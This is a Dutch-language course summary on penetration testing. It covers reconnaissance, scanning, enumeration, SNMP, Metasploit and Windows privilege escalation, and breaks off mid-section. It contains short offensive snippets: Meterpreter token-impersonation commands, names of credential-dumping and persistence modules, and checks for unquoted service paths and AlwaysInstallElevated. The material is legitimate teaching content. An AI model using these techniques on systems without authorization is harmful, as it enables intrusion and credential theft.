# Cybersecurity 3 - Theoretische Samenvatting

## 📑 Inhoudsopgave

1. [Terminologie & Teams](#terminologie--teams)
2. [Footprinting](#footprinting)
3. [Scanning](#scanning)
4. [Enumeration](#enumeration)
5. [Exploitation](#exploitation)
6. [Post-Exploitation](#post-exploitation)
7. [Web Application Pentesting](#web-application-pentesting)
8. [Rapportering](#rapportering)

---

## Terminologie & Teams

### Teams

**Red Team**
- Aanvallende rol in cybersecurity
- Probeert in te breken zonder voorkennis van IT departement
- Simuleert echte aanvallen om zwakke plekken te vinden

**Blue Team**
- Verdedigende kant van cybersecurity
- Beschermt systemen en netwerken
- Monitort en reageert op beveiligingsincidenten

**Purple Teaming**
- Combinatie waarbij red en blue teams samenwerken
- Attackers tonen hun technieken aan defenders
- Defenders leren direct hoe ze aanvallen kunnen detecteren en blokkeren
- Verbetert de algehele beveiligingspositie

### Testing Methodologieën

**Penetration Testing (Pentesting)**
- Gecontroleerde simulatie van een cyberaanval
- Systematisch zoeken naar kwetsbaarheden
- Geautoriseerd en binnen afgesproken scope

**Code Review**
- Analyseren van broncode op programmeerfouten
- Identificeren van security bugs en kwetsbaarheden
- Kan manueel of geautomatiseerd gebeuren

**Config Review**
- Controle van configuraties van systemen en software
- Identificeren van misconfiguraties die tot kwetsbaarheden leiden
- Checken tegen security best practices

**Bug Bounty**
- Publiek programma waarbij bedrijven ethical hackers uitnodigen
- Hackers zoeken naar bugs en kwetsbaarheden
- Beloning voor gerapporteerde beveiligingsproblemen

### Blue Team Rollen

**CSIRT (Computer Security Incident Response Team)**
- Reageert op beveiligingsincidenten
- Coördineert incident response
- Minimaliseert schade en herstelt systemen

**SOC (Security Operations Center)**
- 24/7 monitoring van netwerk en systemen
- Realtime detectie van bedreigingen
- Centrale plek voor security operations

**Threat Intelligence**
- Analyseert aanvalspatronen en dreigingen
- Verzamelt informatie over aanvallers en technieken
- Voorspelt toekomstige aanvallen

**Developers**
- Focussen op secure coding practices
- Bouwen veilige applicaties vanaf het begin
- Implementeren security controls in code

**Network Defenders**
- Beschermen het netwerk met firewalls en IDS/IPS
- Monitoren netwerkverkeer op anomalieën
- Implementeren netwerk segmentatie

**Digital Forensic Analysts**
- Onderzoeken aanvallen achteraf
- Verzamelen en analyseren digitaal bewijsmateriaal
- Reconstrueren aanvalsscenario's

**Vulnerability Management**
- Beheren en prioriteren van kwetsbaarheden
- Coördineren van patching en remediation
- Risico-assessments uitvoeren

### Types Pentesting

**External Pentesting**
- Testen vanaf buitenaf (internet)
- Simuleert externe aanvaller
- Richt zich op publiek zichtbare systemen

**Internal Pentesting**
- Testen vanuit intern netwerk
- Simuleert insider threat of gecompromitteerd account
- Evalueert interne security controls

**Physical Pentesting**
- Testen van fysieke beveiliging
- Badge cloning, tailgating, dumpster diving
- Toegang verkrijgen tot gebouwen en datacenters

**Perimeter Pentesting**
- Focust op netwerkperimeter
- Firewalls, routers, VPN's
- Entry points naar intern netwerk

**Web Application Pentesting**
- Testen van webapplicaties op kwetsbaarheden
- OWASP Top 10 vulnerabilities
- API security testing

**Mobile Application Pentesting**
- Testen van iOS en Android apps
- Client-side en server-side vulnerabilities
- Data storage en transmission security

**Infrastructure Pentesting**
- Servers, databases, operating systems
- Network services en protocols
- Misconfigurations en patch management

**Network Pentesting**
- Netwerkarchitectuur en segmentatie
- Wireless security
- Network devices en protocols

### Hacking Modes

**Black Box**
- Tester krijgt geen informatie over doelwit
- Simuleert externe aanvaller zonder voorkennis
- Meest realistische scenario maar tijdrovend

**White Box**
- Tester krijgt volledige informatie over doelwit
- Toegang tot broncode, architectuur, credentials
- Meest diepgaande en grondige test

**Grey Box**
- Tester krijgt gedeeltelijke informatie
- Simuleert insider of gecompromitteerd account
- Balans tussen realisme en efficiëntie

### Malicious Hackers Types

**Script Kiddies**
- Onervaren hackers met beperkte technische kennis
- Gebruiken bestaande tools zonder te begrijpen hoe ze werken
- Vaak gemotiveerd door aandacht of lol

**Suicide Hackers**
- Hackers die geen rekening houden met consequenties
- Bereid om gevangen genomen te worden
- Extreme ideologische of persoonlijke motivaties

**Hacktivists**
- Hacken om politieke of sociale boodschap over te brengen
- Gemotiveerd door activisme
- Voorbeelden: Anonymous, WikiLeaks

**Nation States**
- Werken namens overheden of inlichtingendiensten
- Geavanceerde persistent threats (APT's)
- Enorme resources en geavanceerde technieken

### Social Engineering Principes

**1. Reciprocity (Wederkerigheid)**
- Mensen voelen zich verplicht iets terug te doen
- Als iemand je helpt, wil je terughelpen
- Gebruikt in scams zoals Tinder romance scams

**2. Commitment and Consistency (Consistentie)**
- Mensen willen consistent blijven met eerdere acties
- Kleine onschuldige stap leidt tot grotere commitments
- Onschuldige enquête escaleert naar privé-informatie delen

**3. Social Proof (Sociale bewijskracht)**
- Mensen volgen gedrag van anderen
- "200 collega's hebben hun wachtwoord al veranderd"
- Creëert valse urgentie en groepsdruk

**4. Authority (Autoriteit)**
- Mensen gehoorzamen figuren met gezag
- Nabootsen van CEO, IT-support, overheid
- Misbruik van vertrouwen in autoriteit

**5. Liking (Sympathie)**
- Mensen helpen graag mensen die ze aardig vinden
- Opbouwen van rapport en vertrouwen
- Persoonlijke connecties exploiteren

**6. Scarcity (Schaarste)**
- Mensen handelen sneller onder tijdsdruk
- "Je account wordt binnen 24 uur verwijderd"
- Creëert panic en overhaaste beslissingen

### Social Engineering Methods

**Phishing**
- Frauduleuze e-mails die legitiem lijken
- Doel: credentials stelen of malware verspreiden
- Massaal verstuurd naar veel targets

**Spear Phishing**
- Gerichte phishing naar specifieke personen
- Gepersonaliseerde content gebaseerd op research
- Hogere success rate dan generieke phishing

**Vishing (Voice Phishing)**
- Telefonische social engineering
- Voice calls om informatie te verkrijgen
- Vaak gecombineerd met caller ID spoofing

**Smishing (SMS Phishing)**
- Phishing via SMS-berichten
- Korte berichten met malicious links
- Exploiteert vertrouwen in tekstberichten

**Impersonation (Identiteitsdiefstal)**
- Zich voordoen als iemand anders
- Kan fysiek of digitaal zijn
- Misbruik van vertrouwen in autoriteit of bekenden

### Basisconcepten

**Assets (Bedrijfsmiddelen)**
- Wat we beschermen: data, intellectuele eigendom, hardware, software
- Alles met waarde voor de organisatie
- Vormen de basis van risico-analyse

**Threats (Bedreigingen)**
- Alles of iedereen die schade kan veroorzaken
- Externe aanvallers, malware, natuurrampen
- Potentiële bronnen van beveiligingsincidenten

**Vulnerabilities (Kwetsbaarheden)**
- Zwakke plekken in systemen
- Kunnen door threats worden misbruikt
- Software bugs, misconfigurations, zwakke wachtwoorden

**Risks (Risico's)**
- Kans dat een threat een vulnerability exploiteert
- Combinatie van waarschijnlijkheid en impact
- Berekend als: Risico = Threat × Vulnerability × Impact

### Pentest Methodology

**1. Planning**
- Scope en doelstellingen bepalen
- Rules of engagement vaststellen
- Legale en ethische grenzen definiëren

**2. Footprinting & Scanning**
- Informatie verzamelen over target
- Passive en active reconnaissance
- Identificeren van attack surface

**3. Enumeration**
- Diepgaande analyse van gevonden systemen
- Services, users, shares identificeren
- Gedetailleerde systeeminformatie verzamelen

**4. Exploitation**
- Kwetsbaarheden exploiteren om toegang te verkrijgen
- Gebruik van exploits en payloads
- Initial access naar systeem

**5. Post-Exploitation**
- Privilege escalation uitvoeren
- Lokale enumeratie voor verder compromitteren
- Lateral movement naar andere systemen

**6. Reporting**
- Documenteren van bevindingen
- Risico-analyse en prioritering
- Remediatie-aanbevelingen formuleren

---

## Footprinting

### Definitie

Footprinting is het eerste stadium van reconnaissance waarbij een aanvaller zoveel mogelijk informatie verzamelt over een doelwit. Dit vormt de basis voor alle verdere aanvalsstappen.

### Doelen van Footprinting

- Identificeren van attack surface
- Verzamelen van informatie voor social engineering
- Begrijpen van de organisatiestructuur
- Identificeren van technologieën en systemen in gebruik
- Vinden van entry points voor verdere aanvallen

### Active Footprinting

**Definitie:** Directe interactie met het doelsysteem waarbij detectie mogelijk is.

**Kenmerken:**
- Directe communicatie met target systemen
- Kan gedetecteerd worden door IDS/IPS
- Levert meer gedetailleerde en actuele informatie
- Hogere accuraatheid maar meer risico

**Technieken:**
- Ping sweeps om actieve hosts te vinden
- Port scanning voor open services
- Network mapping voor topologie
- Host discovery voor systemen identificatie

### Passive Footprinting

**Definitie:** Informatie verzamelen zonder directe interactie met het doelsysteem.

**Kenmerken:**
- Geen directe communicatie met target
- Niet detecteerbaar door security systemen
- Gebruikt publiek beschikbare informatie
- Veiliger maar mogelijk verouderde informatie

**Technieken:**
- Website browsing en content analyse
- WHOIS lookups voor domein informatie
- DNS records analyseren
- Social media intelligence (OSINT)
- Robots.txt analyse voor verborgen directories
- LinkedIn profiles voor organisatiestructuur

### Google Dorks (Google Hacking)

**Definitie:** Geavanceerde zoektechnieken met specifieke operators om verborgen of gevoelige informatie te vinden.

**Doel:**
- Vinden van misconfiguraties
- Geëxposeerde gevoelige bestanden
- Kwetsbare systemen identificeren
- Database dumps en credentials

**Voordelen:**
- Volledig passief
- Veel publieke informatie beschikbaar
- Geen speciale tools nodig

### DNS Tools en Technieken

**NS Lookup (Name Server Lookup)**
- Tool voor querying Domain Name System
- Vertaalt domeinnamen naar IP-adressen
- Kan verschillende DNS record types opvragen
- Essentieel voor network mapping

**WHOIS Protocol**
- Protocol voor domein registratie informatie
- Geeft eigenaar, registrar, contactgegevens
- Expiration dates en nameservers
- Vaak beschermd door privacy services

### DNS Records Types

**A Record (Address Record)**
- Koppelt domeinnaam aan IPv4-adres
- Meest gebruikte DNS record type
- Directe hostname naar IP mapping

**AAAA Record**
- IPv6 variant van A record
- Koppelt domeinnaam aan IPv6-adres
- Steeds belangrijker met IPv6 adoptie

**NS Record (Name Server)**
- Verwijst naar authoritative nameservers
- Definieert welke servers DNS informatie beheren
- Belangrijk voor zone transfers

**MX Record (Mail Exchange)**
- Bepaalt mailservers voor domein
- Priority values voor redundancy
- Cruciaal voor email routing

**CNAME Record (Canonical Name)**
- Alias die verwijst naar andere domeinnaam
- Gebruikt voor subdomains en load balancing
- Kan niet coexisteren met andere records voor zelfde naam

**TXT Record (Text)**
- Bevat tekstinformatie voor verschillende doeleinden
- SPF records voor email authenticatie
- Domain verification tokens
- DKIM keys voor email security

**HINFO Record (Host Information)**
- Geeft informatie over host hardware en OS
- Zelden gebruikt vanwege security concerns
- Kan informatie lekken naar aanvallers

**SOA Record (Start of Authority)**
- Bevat domein autoriteit informatie
- Serial numbers voor zone updates
- Refresh en retry timers
- Primary nameserver identificatie

**SRV Record (Service)**
- Specificeert locatie van services
- Gebruikt voor VoIP, LDAP, etc.
- Bevat port en priority informatie

**PTR Record (Pointer)**
- Reverse DNS lookup
- Koppelt IP-adres aan domeinnaam
- Gebruikt voor email verification

### Footprinting Tools Overzicht

**BuiltWith / Wappalyzer**
- Browser extensies voor technologie detectie
- Identificeren frameworks, CMS, analytics
- Server software en programming languages

**whatweb**
- Command-line tool voor website fingerprinting
- Detecteert web technologies
- Plugin-based architecture

**HTTrack**
- Website copier tool
- Downloadt complete websites offline
- Gebruikt voor offline analyse

**Sublist3r**
- Subdomain enumeration tool
- Gebruikt search engines en APIs
- Vind hidden subdomains

**wafw00f**
- Web Application Firewall detectie
- Identificeert WAF presence en type
- Helpt bij planning van aanval

**Netcraft**
- Website reconnaissance tool
- Site reports en technology profiling
- Uptime en hosting informatie

**theHarvester**
- Email en subdomain harvesting
- Verzamelt informatie van publieke bronnen
- OSINT aggregation tool

**Nmap**
- Network scanning en host discovery
- Port scanning en service detection
- OS fingerprinting capabilities

---

## Scanning

### Definitie

Scanning is de fase waarin hosts worden geïdentificeerd binnen IP-ranges en waarbij poorten en services worden ontdekt. Dit volgt op footprinting en gaat vooraf aan enumeration.

### Detectie Risico's

**IDS/IPS Systemen**
- Intrusion Detection Systems detecteren scanning activiteit
- Intrusion Prevention Systems kunnen scanning blokkeren
- Rate limiting en behavioral analysis
- Noodzaak van stealth technieken

**Mitigatie Strategieën:**
- Gebruik van proxies of VPN's
- Rate limiting van scan traffic
- Randomiseren van scan patronen
- Fragmentatie van packets

### Scanmethodes

**Network Scan/Sweep**
- Identificeren van actieve hosts in een netwerk
- Bepalen welke IP-adressen in gebruik zijn
- Foundation voor verdere scanning activiteiten

**Port Scan**
- Identificeren van open, closed en filtered ports
- Bepalen welke services actief zijn
- Essentieel voor service enumeration

**Fingerprinting**
- OS detectie via packet characteristics
- Service version identification
- Banner grabbing voor software versies

**Vulnerability Scan**
- Automatisch detecteren van bekende kwetsbaarheden
- CVE matching tegen service versions
- Risk assessment en prioritering

### Network Scan / Ping Sweep

**Concept:**
ICMP echo requests uitsturen naar IP-ranges en wachten op replies om actieve hosts te identificeren.

**Nadelen:**
- Veel systemen blokkeren ICMP standaard
- Firewalls filteren vaak ping traffic
- Grote sweeps triggeren IPS systemen
- Niet alle actieve hosts reageren op ping

**Alternatieven:**
- TCP SYN scans naar common ports
- ARP requests in local networks
- UDP probes naar specifieke services

### Port States

**Open**
- Poort accepteert verbindingen
- Service luistert actief op de poort
- Interessant voor verder onderzoek

**Closed**
- Poort is bereikbaar maar geen service draait
- Host is actief maar port is niet in gebruik
- RST packets worden teruggestuurd

**Filtered**
- Geen duidelijke respons ontvangen
- Waarschijnlijk gefilterd door firewall
- Packet filtering of rate limiting actief

**Unfiltered (Nmap)**
- Poort is bereikbaar maar staat onduidelijk
- ACK scans kunnen dit identificeren
- Firewall laat packets door maar unclear status

**Open|Filtered (Nmap)**
- Nmap kan niet onderscheiden tussen open of filtered
- Geen response ontvangen op probe
- Vaak bij UDP of stealth scans

**Closed|Filtered (Nmap)**
- Onduidelijk of closed of filtered
- Specifieke scan types geven deze status
- Vereist aanvullende verificatie

### TCP Fundamentals

**3-Way Handshake:**
De fundamentele verbindingsopbouw in TCP:
1. SYN - Client initieert verbinding
2. SYN/ACK - Server acknowledget en synchroniseert
3. ACK - Client bevestigt, verbinding established

**TCP Flags Betekenis:**

**SYN (Synchronize)**
- Initieert nieuwe verbinding
- Bevat initial sequence number
- Gebruikt in handshake

**ACK (Acknowledge)**
- Bevestigt ontvangst van data
- Aanwezig in bijna alle packets na handshake
- Essential voor reliable delivery

**FIN (Finish)**
- Netjes afsluiten van verbinding
- Twee-weg afsluiting (beide kanten FIN)
- Graceful connection termination

**RST (Reset)**
- Onmiddellijke verbinding terminatie
- Gebruikt bij errors of refused connections
- Abrupt connection termination

**PSH (Push)**
- Data moet direct naar applicatie
- Niet bufferen in TCP stack
- Gebruikt voor interactive data

**URG (Urgent)**
- Markeert data als urgent
- Samen met urgent pointer
- Zelden gebruikt in moderne systemen

### TCP Scanning Technieken

**Full/Open (Connect) Scan**
- Volledige 3-way handshake wordt uitgevoerd
- Meest betrouwbare maar ook meest detecteerbare methode
- Volledig established connections worden gelogd
- Traag maar accurate results
- Vereist geen speciale privileges

**SYN Scan (Half-open/Stealth)**
- Stuurt SYN, wacht op SYN/ACK, stuurt RST
- Verbinding wordt nooit fully established
- Minder zichtbaar in application logs
- Vereist root/administrator privileges
- Sneller dan full connect scan

**Xmas Tree Scan**
- Zet FIN, URG en PSH flags simultaan
- Illegale combinatie volgens RFC
- Reactie afhankelijk van OS implementatie
- Kan OS fingerprinting helpen
- Werkt niet tegen alle systemen

**FIN Scan**
- Stuurt enkel FIN flag
- Exploiteert RFC implementatie details
- Kan sommige firewalls omzeilen
- Closed ports sturen RST
- Open/filtered ports geen response

**Null Scan**
- Stuurt packet zonder enige flags
- Verwacht RST voor closed ports
- Geen response suggereert open/filtered
- OS-dependent behavior
- Stealthy maar niet altijd betrouwbaar

**Idle Scan (Zombie Scan)**
- Gebruikt derde party "zombie" host
- Analyseert IP ID increments van zombie
- Extreem stealthy - verbergt scanner IP
- Complexe techniek maar zeer effectief
- Vereist geschikte zombie host

**ACK Scan**
- Test firewall rules niet port status
- Bepaalt of ports filtered of unfiltered zijn
- RST response = unfiltered
- Geen response = filtered
- Helpt firewall mapping

### UDP Scanning

**Kenmerken:**
- UDP is connectionless protocol
- Geen handshake of acknowledgments
- Moeilijker te scannen dan TCP
- Langzamer en minder betrouwbaar

**Response Interpretatie:**
- ICMP Port Unreachable = closed
- ICMP andere errors = filtered
- Geen response = open of filtered
- Soms UDP response = definitief open

**Uitdagingen:**
- Rate limiting van ICMP responses
- Traag scannen noodzakelijk
- Veel false positives
- Vereist geduld en retry logic

### Fingerprinting

**Active Fingerprinting**
- Actief versturen van crafted packets
- Analyseren van responses tegen database
- Snelle en accurate OS detectie
- Wel detecteerbaar door security systemen

**Passive Fingerprinting**
- Enkel observeren van netwerk traffic
- Analyseren van TTL, window sizes, packet patterns
- Volledig ondetecteerbaar
- Trager en minder accurate

**Identificatie Parameters:**
- TTL (Time To Live) waarden variëren per OS
- TCP Window Size verschillen
- TCP Options volgorde en waarden
- IP ID sequencing
- DF (Don't Fragment) flag behavior

**Voorbeelden OS Signatures:**
- Linux TTL typisch 64
- Windows TTL meestal 128
- Network devices vaak 255
- Window sizes variëren per implementatie

### Vulnerability Scanning Tools

**OpenVAS**
- Open source vulnerability scanner
- Grote vulnerability database
- Comprehensive scanning capabilities
- Community en enterprise versies

**Nessus**
- Commercial vulnerability scanner
- Industry standard tool
- Extensive plugin library
- Compliance checking features

**Nexpose**
- Rapid7 vulnerability management
- Integration met Metasploit
- Risk scoring en prioritization
- Asset discovery en tracking

**Retina**
- BeyondTrust vulnerability scanner
- Configuration assessment
- Patch management integration
- Compliance auditing

### Defense Tegen Scanning

**Preventieve Maatregelen:**
- Minimaliseer attack surface
- Gebruik geharde OS configuraties
- Disable onnodige services
- Implement rate limiting

**Detectie Mechanismen:**
- IDS/IPS deployment
- Anomaly detection systemen
- Log aggregation en analysis
- Behavioral analytics

**Response Strategieën:**
- Automated blocking bij detectie
- DMZ segmentatie
- Honeypots voor detection
- Incident response procedures

**Proactieve Aanpak:**
- Regelmatige vulnerability scans
- Automated patching systemen
- Security hardening guidelines
- Continuous monitoring

---

## Enumeration

### Definitie

Enumeration is de fase **na scanning** waarin dieper wordt gegraven in geïdentificeerde systemen. Er wordt een daadwerkelijke connectie gemaakt met het doelsysteem om gedetailleerde informatie te verkrijgen.

### Risico's van Enumeration

**Juridische Risico's:**
- Actieve connectie met systemen
- Kan gezien worden als unauthorized access
- Vereist expliciete toestemming
- Documentatie van scope essentieel

**Detectie Risico's:**
- Hogere kans op detectie dan scanning
- Genereert meer logs
- Triggert behavioral analytics
- Vereist voorzichtigheid

### Verzamelde Informatie

**Systeem Informatie:**
- Machine names en hostnames
- Operating system details en versies
- Installed software en patches
- System architecture

**User Informatie:**
- Gebruikersnamen en accounts
- Groepslidmaatschappen
- Privileges en permissions
- Password policies

**Netwerk Informatie:**
- Shares en mounted drives
- Network services en hun configuraties
- Routing tables en interfaces
- DNS en SNMP informatie

**Applicatie Informatie:**
- Draaiende services en versies
- Application frameworks
- Database systems
- Web servers en middleware

---

## Windows Enumeration

### Groepen Concept

**Functie van Groepen:**
- Centraal beheer van toegangsrechten
- Users erven rechten via groepslidmaatschap
- Simplificeert permissions management
- Scalable security model

**Local Groups**
- Gelden alleen op de lokale computer
- Opgeslagen in lokale SAM database
- Niet zichtbaar voor domein
- Gebruikt voor standalone systemen

**Domain Groups**
- Gelden binnen gehele domein
- Opgeslagen in Active Directory
- Centraal beheerd door domain controllers
- Enterprise-wide scope

**Universal Groups**
- Bestaan over domein grenzen heen
- Gebruikt in multi-domain forests
- Replicated naar alle domain controllers
- Global catalog storage

**Nested Groups:**
- Groepen kunnen lid zijn van andere groepen
- Complexe rechten hierarchieën mogelijk
- Moeilijker te auditieren
- Kan onbedoelde privileges geven

### Security Identifiers (SID)

**Definitie:**
Unieke identifier voor elk security principal in Windows (users, groups, computers).

**Structuur:**
- Revision nummer
- Authority identifier  
- Subauthorities
- Relative Identifier (RID)

**Gebruik:**
- Identificatie onafhankelijk van naam
- Permissions gekoppeld aan SID
- SID blijft bij account rename
- Forensics en audit trails

**Well-known SIDs:**
- S-1-5-18 = Local System
- S-1-5-21-...-500 = Administrator
- S-1-5-21-...-501 = Guest
- Altijd dezelfde betekenis

### Security Databases

**SAM (Security Accounts Manager)**
- Lokale user accounts database
- Wachtwoord hashes opslag
- Located in System32/config
- Locked tijdens OS runtime
- Offline access mogelijk via boot media

**Active Directory (AD)**
- Centralized directory service
- Bevat alle domain resources
- Users, computers, groups, policies
- Replicated tussen domain controllers
- LDAP protocol voor queries

**Risico's:**
- SAM dump geeft lokale hashes
- AD compromise = enterprise breach
- Credential reuse common
- Golden Ticket attacks
- Pass-the-Hash mogelijkheden

### Null Sessions

**Historische Context:**
- Kwetsbaarheid in oudere Windows versies
- Anonymous access naar IPC$ share
- Geen authenticatie vereist
- Legacy compatibility feature

**Mogelijkheden:**
- User enumeration zonder credentials
- Share enumeration
- Policy information extraction
- Group membership details

**Moderne Status:**
- Standaard uitgeschakeld sinds Vista/2008
- Restclient policy strikter
- Backwards compatibility soms enabled
- Nog relevant voor legacy systemen

**Security Implications:**
- Grote information disclosure
- Basis voor verdere aanvallen
- Social engineering materiaal
- Privilege escalation reconnaissance

---

## Linux Enumeration

### Gebruikers Systeem

**passwd File (/etc/passwd)**
- World-readable configuratie file
- Basis gebruikersinformatie
- Username, UID, GID, home directory, shell
- Geen wachtwoorden (shadow system)

**shadow File (/etc/shadow)**
- Root-only toegang
- Bevat wachtwoord hashes
- Password aging informatie
- Account expiry details

**UID Ranges Betekenis:**

**UID 0 - Root**
- Superuser met volledige privileges
- Unrestricted system access
- All security checks bypassed
- Target voor privilege escalation

**UID 1-99 - System Accounts**
- Service accounts voor daemons
- Geen login privileges meestal
- Limited system permissions
- Used by system services

**UID 100-999 - System Reserved**
- Reserved voor system gebruik
- Varies per distribution
- Application service accounts

**UID 1000+ - Regular Users**
- Normale gebruikersaccounts
- Standard privileges
- Home directories in /home
- Interactive login mogelijk

### Groepen Systeem

**group File (/etc/group)**
- Definieert alle groups
- Group name, GID, members
- Primary en secondary groups
- Permission management

**Primary Group:**
- Assigned bij user creation
- Default group voor files
- Specified in /etc/passwd
- One per user

**Secondary Groups:**
- Additional group memberships
- Provides extra permissions
- Meerdere mogelijk per user
- Listed in /etc/group

**GID 0 - Root Group:**
- Equivalent aan root user
- Full system privileges
- Dangerous membership
- Audit critically

**sudo Group:**
- Administrative privileges
- Execute commands as root
- Modern alternative to su
- Logged in auth.log

### Unshadow Concept

**Doel:**
Combineren van passwd en shadow files voor password cracking.

**Proces:**
- Merget gebruikersnamen met hashes
- Creëert format voor John/Hashcat
- Vereist root access tot shadow
- Output bevat crackable entries

**Security Implicaties:**
- Shadow file bescherming essentieel
- File permissions critical
- Audit access logs
- Strong password policies nodig

---

## Network Enumeration

### DNS Enumeration

**Zone Transfers (AXFR)**

**Concept:**
- Complete replicatie van DNS zone
- Bedoeld voor secondary nameservers
- Bevat alle DNS records van domein

**Misbruik:**
- Misconfigured servers allow public transfers
- Reveals complete infrastructure
- Subdomains en internal hostnames
- Email servers en other services

**Impact:**
- Complete network mapping in één request
- Organizational structure visible
- Attack surface fully exposed
- Foundation voor targeted attacks

**Verdediging:**
- Restrict transfers naar trusted IPs only
- Implement TSIG (transaction signatures)
- Split-horizon DNS configuration
- Regular security audits

**Subdomain Enumeration:**
- Alternative wanneer transfers blocked
- Brute force van common names
- Certificate transparency logs
- Search engine dorking

### Routing Protocol Enumeration

**CDP (Cisco Discovery Protocol)**

**Functie:**
- Layer 2 neighbor discovery
- Cisco proprietary protocol
- Shares device information
- Enabled default on Cisco devices

**Information Disclosed:**
- Device hostname en model
- IP addresses van interfaces
- IOS version en capabilities
- VLAN information
- Port identifiers

**Risico's:**
- Complete network topology mapping
- Software versions voor exploit matching
- Inter-VLAN routing discovery
- Trust relationships exposed

# Cybersecurity 3 - Aanvullende Theorie

## LLDP (Link Layer Discovery Protocol)

### Definitie
**LLDP (Link Layer Discovery Protocol)** is een vendor-neutrale Layer 2 protocol voor neighbor discovery, ontworpen als open standaard alternatief voor Cisco's proprietary CDP.

### Functie
- IEEE 802.1AB standaard protocol
- Multi-vendor support (niet alleen Cisco)
- Neighbor discovery op Layer 2
- Device information sharing tussen directe neighbors

### Information Disclosed
- System name en description
- Port identification
- VLAN information
- Device capabilities
- Management addresses
- Power over Ethernet (PoE) details
- Network policies

### Risico's
- Complete network topology mapping
- Device inventory revelation
- Management IP addresses exposed
- Cross-vendor network insights
- Attack surface identification

### Verschil CDP vs LLDP

**CDP (Cisco Discovery Protocol):**
- Cisco proprietary
- Enabled by default op Cisco devices
- Meer vendor-specific informatie
- Alleen Cisco ecosysteem

**LLDP:**
- Open standaard (IEEE 802.1AB)
- Multi-vendor ondersteuning
- Moet vaak handmatig enabled worden
- Interoperabiliteit tussen merken

### Defense
- Disable LLDP op end-user facing ports
- Enable alleen op trusted management interfaces
- Gebruik LLDP-MED voor Voice VLAN separation
- Regular audits van LLDP neighbors
- Segment management traffic

---

## SNMP Vervolg - Advanced Concepten

### SNMP Security Levels (v3)

**NoAuthNoPriv:**
- Geen authenticatie
- Geen encryptie
- Equivalent aan v1/v2c maar met username

**AuthNoPriv:**
- Authenticatie via HMAC-MD5 of HMAC-SHA
- Geen encryptie van data
- Beschermt tegen tampering

**AuthPriv:**
- Authenticatie via HMAC-MD5/SHA
- Encryptie via DES, 3DES of AES
- Volledige confidentiality en integrity

### SNMP Community Strings

**Public (Read-Only):**
- Default community string
- Alleen GET operations
- Meest voorkomend misconfigured

**Private (Read-Write):**
- Staat SET operations toe
- Kan configuratie wijzigen
- Zeer gevaarlijk als compromised

**Best Practices:**
- Wijzig default community strings
- Gebruik complexe strings (lange random values)
- Implement ACLs (Access Control Lists)
- Restrict naar specifieke management IPs

### SNMP Enumeration Technieken

**snmpwalk:**
```bash
snmpwalk -v2c -c public target_ip
```
- Walk door complete MIB tree
- Verzamel alle beschikbare OIDs
- Identificeer device type en versie

**snmpget:**
```bash
snmpget -v2c -c public target_ip OID
```
- Query specifieke OID
- Targeted information gathering
- Sneller dan snmpwalk

**Common OIDs:**
- 1.3.6.1.2.1.1.1.0 - System Description
- 1.3.6.1.2.1.1.5.0 - System Name
- 1.3.6.1.2.1.2.2.1.2 - Interface Description
- 1.3.6.1.2.1.4.20.1.1 - IP Addresses
- 1.3.6.1.2.1.6.13.1.3 - TCP Local Ports

### SNMP Traps

**Definitie:**
- Unsolicited messages van agent naar manager
- Event notification mechanisme
- UDP port 162 (manager)

**Gebruik:**
- Link up/down notifications
- Authentication failures
- Threshold exceeded alerts
- System reboots

**Security Implicatie:**
- Trap receivers kunnen target zijn
- Information leakage via traps
- Spoofed traps mogelijk zonder v3

---

## Metasploit Framework - Advanced

### Meterpreter Capabilities

**Kernfunctionaliteit:**
- In-memory payload execution
- Encrypted communication
- Extensible via modules
- Platform-independent API

**Belangrijke Commands:**

**Systeem Informatie:**
```
sysinfo          # OS en architecture info
getuid           # Current user context
getprivs         # Current privileges
ps               # Process list
```

**Bestandssysteem:**
```
ls               # Directory listing
cd               # Change directory
pwd              # Current directory
download         # Download file
upload           # Upload file
search           # Search for files
```

**Netwerk:**
```
ipconfig         # Network configuration
route            # Routing table
arp              # ARP cache
netstat          # Network connections
portfwd          # Port forwarding
```

**Privilege Escalation:**
```
getsystem        # Attempt privilege escalation
getprivs         # Show privileges
```

**Process Migration:**
```
ps               # List processes
migrate [PID]    # Migrate to process
```

### Payload Types

**Singles:**
- Standalone payload
- Compleet in zichzelf
- Grotere size
- Voorbeeld: windows/shell_bind_tcp

**Stagers:**
- Kleine initial payload
- Download stage 2
- Stealth door size
- Voorbeeld: windows/meterpreter/reverse_tcp

**Stages:**
- Tweede deel van payload
- Volledige functionaliteit
- In-memory execution
- Meterpreter is een stage

### Exploit vs Auxiliary Modules

**Exploit Modules:**
- Exploiteren kwetsbaarheden
- Krijgen access/code execution
- Gebruiken payloads
- Voorbeeld: exploit/windows/smb/ms17_010_eternalblue

**Auxiliary Modules:**
- Geen exploitation
- Scanning en enumeration
- Information gathering
- Password attacks
- Voorbeeld: auxiliary/scanner/smb/smb_version

### Post-Exploitation Modules

**Credential Dumping:**
- post/windows/gather/hashdump
- post/windows/gather/smart_hashdump
- post/linux/gather/hashdump

**Persistence:**
- post/windows/manage/persistence_exe
- post/linux/manage/sshkey_persistence

**Privilege Escalation:**
- post/multi/recon/local_exploit_suggester
- post/windows/gather/enum_patches

**Lateral Movement:**
- post/windows/gather/enum_domain
- post/windows/gather/enum_shares

---

## Windows Privilege Escalation - Detailed

### Token Impersonation

**Definitie:**
- Windows access tokens bevatten security context
- Tokens kunnen gestolen en geïmpersoneerd worden
- SeImpersonate privilege is key

**Technieken:**
- Juicy Potato (Windows Server 2016 en ouder)
- Rogue Potato (Windows Server 2019+)
- PrintSpoofer (Modern Windows)

**Meterpreter:**
```
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
```

### Unquoted Service Paths

**Concept:**
- Service paths met spaties maar zonder quotes
- Windows probeert executables op multiple locaties
- Exploitation door malicious executable plaatsen

**Voorbeeld:**
```
C:\Program Files\My Service\service.exe
```
Windows zoekt naar:
1. C:\Program.exe
2. C:\Program Files\My.exe
3. C:\Program Files\My Service\service.exe

**Detection:**
```powershell
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### AlwaysInstallElevated

**Registry Settings:**
```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
```

**Impact:**
- MSI packages installeren met SYSTEM privileges
- Elke user kan elevated installer draaien

**Check:**
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
